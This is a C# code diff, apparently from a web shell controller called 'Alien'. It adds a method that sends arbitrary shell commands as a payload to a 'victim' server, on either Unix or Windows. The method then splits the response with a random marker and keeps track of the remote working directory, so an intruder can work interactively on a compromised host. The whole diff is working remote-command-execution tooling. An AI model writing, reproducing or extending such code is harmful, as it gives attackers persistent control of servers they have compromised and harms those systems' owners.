@@ -9,10 +9,42 @@ namespace Alien
     internal class clsfnShell
     {
         private clsWeb m_web { get; set; }
+        public string m_szCurrentDir { get; set; }
 
         public clsfnShell(clsWeb web)
         {
             m_web = web;
+        }
+
+        public async Task<(string szCurrentDir, string szOutput)> fnShellExecute(string szCommand)
+        {
+            string szCurrentDir = string.Empty;
+            string szOutput = string.Empty;
+
+            string szSplitter = clsEzData.fnszGenerateRandomStr(15);
+
+            if (m_web.m_victim.m_bUnixLike)
+                szCurrentDir = $"cd \"{m_szCurrentDir}\" && {szCommand} && echo [{szSplitter}] && pwd";
+            else
+                szCurrentDir = $"cd /d \"{m_szCurrentDir}\" & {szCommand} & echo [{szSplitter}] & cd";
+
+            string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { szCurrentDir, m_web.m_victim.ShellEncoding });
+            string[] asResp = szResp.Split($"[{szSplitter}]");
+            
+            if (asResp.Length == 2)
+            {
+                szOutput = asResp[0];
+                szCurrentDir = asResp[1];
+
+                m_szCurrentDir = szCurrentDir.Trim().Replace("\n", string.Empty).Replace(Environment.NewLine, string.Empty);
+            }
+            else
+            {
+                szOutput = szResp;
+                szCurrentDir = m_szCurrentDir;
+            }
+
+            return (szCurrentDir, szOutput);
         }
     }
 }
